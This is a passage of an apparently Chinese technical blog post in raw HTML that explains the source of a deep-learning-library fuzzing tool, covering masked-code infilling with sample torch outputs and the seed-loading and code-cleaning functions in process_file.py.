&#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    conv = torch.&lt;|mask:0|&gt;(1, 1, 3)</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    randn</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>用第二个&lt;|mask:0|&gt;和&lt;|endofmask|&gt;之间的代码代替&lt;|mask:0|&gt;，如果没有&lt;|endofmask|&gt;则丢弃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">outputs = [<br>    <span class="hljs-string">&#x27;conv = torch.nn.Conv2d(n_channels, n_filters[0], kernel_size=(7, 7), stride=2, padding=(1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.nn.functional.max_pool1d(x, (1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.nn.functional.pad(conv, (1, 1, 3)&#x27;</span>, <br>    <span class="hljs-string">&#x27;conv = torch.randn(1, 1, 3)&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul></li><li><p>如果有多个mask需要推理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>每次循环前都要调用build_input_multi添加额外的mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">n_infill = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch</span><br><span class="hljs-string">    import numpy as np</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)</span><br><span class="hljs-string">    output = conv2d(input_data)&lt;|mask:2|&gt;&lt;|mask:0|&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>再repeat成batch_size长度的列表</p></li><li><p>generate，结果1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&quot;&quot;&quot;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;|endoftext|&gt;import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>clean code，添加mask后的tmp_prompt，需要推理第二个mask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp_prompt = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>generate，结果2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python">o = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    3, 64, kernel_size=4, padding=1)\n</span><br><span class="hljs-string">    \n</span><br><span class="hljs-string">    print(type(conv2d))\n</span><br><span class="hljs-string">    print(conv2d</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import math</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    3,16, 3, padding=1)\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    print(output_np</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    2,4,3,padding = 1, bias = False</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&#x27;&#x27;&#x27;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    from torch.nn import functional as F\n</span><br><span class="hljs-string">    input_data = torch.autograd.Variable(torch.randn(2,5,7,7).cuda())</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    …… </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br>    <br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;s&gt;&lt;|endoftext|&gt;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    &lt;|mask:0|&gt;\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(&lt;|mask:1|&gt;)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &lt;|mask:2|&gt;</span><br><span class="hljs-string">    &lt;|mask:0|&gt;</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    &lt;|mask:1|&gt;</span><br><span class="hljs-string">    in_channels = 3, out_channels = 3, kernel_size = 3</span><br><span class="hljs-string">    &lt;|endofmask|&gt;</span><br><span class="hljs-string">    ……</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    ]<br></code></pre></td></tr></table></figure></li><li><p>用&lt;|mask:0|&gt;到&lt;|endofmask|&gt;之间的部分替换&lt;|mask:0|&gt;，用&lt;|mask:1|&gt;到&lt;|endofmask|&gt;之间的部分替换&lt;|mask:1|&gt;，缺少&lt;|endofmask|&gt;则丢弃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">outputs = [<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import torch.nn as nn\n</span><br><span class="hljs-string">    import torch.nn.functional as F\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(3, 64, kernel_size=4, padding=1)\n</span><br><span class="hljs-string">    \n</span><br><span class="hljs-string">    print(type(conv2d))\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import math\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(3,16, 3, padding=1)\n</span><br><span class="hljs-string">    print(conv2d)\n</span><br><span class="hljs-string">    print(output_np)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    input_data = torch.randn(1,3,32, 32)\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(2,4,3,padding = 1, bias = False)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>, <br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    import torch\n</span><br><span class="hljs-string">    import numpy as np\n</span><br><span class="hljs-string">    import matplotlib.pylab as plt\n</span><br><span class="hljs-string">    from torchvision.models import resnet\n</span><br><span class="hljs-string">    conv2d = torch.nn.Conv2d(in_channels = 3, out_channels = 3, kernel_size = 3)\n</span><br><span class="hljs-string">    output = conv2d(input_data)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="process-file-py"><a href="#process-file-py" class="headerlink" title="process_file.py"></a>process_file.py</h1><h2 id="get-initial-programs"><a href="#get-initial-programs" class="headerlink" title="get_initial_programs"></a>get_initial_programs</h2><p>种子库目录..&#x2F;codex_seed_programs&#x2F;codex_${TEST_LIB}_seeds&#x2F;fix</p><ul><li><p>因为此时target_api不可能为all，所以apis只有一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">apis = [os.path.join(directory, target_api)]<br></code></pre></td></tr></table></figure></li><li><p>读取所有目标api种子文件，比如..&#x2F;codex_seed_programs&#x2F;codex_tf_seeds&#x2F;fix&#x2F;tf.ones&#x2F;*，处理每个种子</p><ul><li><p>清理种子文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">original = clean_code(<br>    f.read(), prints_and_imports=<span class="hljs-literal">True</span>, comment=<span class="hljs-literal">True</span>, cuda=<span class="hljs-literal">True</span><br>)<br></code></pre></td></tr></table></figure><p><em>clean_code见process_file.py</em></p></li><li><p>初始化SnippetInfill</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">infill = SnippetInfill(<br>    mask_identifier=mask_identifier,<br>    api_call=api_call,<br>    prefix=<span class="hljs-string">&quot;.&quot;</span>.join(api.split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]),<br>    library=library,<br>    replace_type=replace_type,<br>)<br></code></pre></td></tr></table></figure><p><em>SnippetInfill见util&#x2F;instrumentor.py</em></p></li></ul></li><li><p>输出：</p><ul><li>Syntax error：语法错误seed数量</li><li>Multi-API calls：<em>0，乐，这玩意是干嘛的</em></li><li>No Api calls：没有目标api的seed数量</li><li>Successful：替换成功的seed数量</li></ul></li><li><p>返回：ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ret[api.split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>]].append(<br>    &#123;<span class="hljs-string">&quot;original&quot;</span>: original_code, <span class="hljs-string">&quot;infill&quot;</span>: infill_code&#125;<br>)<br></code></pre></td></tr></table></figure></li></ul><p><em>btw，SnippetInfill替换完的infill_code没用：）</em></p><h2 id="clean-code"><a href="#clean-code" class="headerlink" title="clean_code"></a>clean_code</h2><p>主要包括：</p><ul><li><p>清除函数定义</p></li><li><p>清除tags，由于seed是codex生成的，可能会有如下形式的tag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tag_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;.+&gt;&quot;</span>)  <span class="hljs-comment"># such as &lt;cell&gt;, &lt;test&gt;, &lt;/cell&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>去掉一些api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">bad_codes = [<br>    <span class="hljs-string">&quot;tf.test.main()&quot;</span>,<br>    <span class="hljs-string">&quot;tf.compat.v1.test.main()&quot;</span>,<br>    <span class="hljs-string">&quot;disable_eager_execution()&quot;</span>,<br>    <span class="hljs-string">&quot;disable_v2_behavior&quot;</span>,<br>    <span class="hljs-string">&quot;InteractiveSession&quot;</span>,<br>    <span class="hljs-string">&quot;exit()&quot;</span>,<br>]<br></code></pre></td></tr></table></figure></li><li><p>去除种子设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">&quot;torch\.manual_seed\(\S+\)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, code)<br></code></pre></td></tr></table></figure></li><li><p>去除空行</p></li><li><p>去除主函数</p><figure 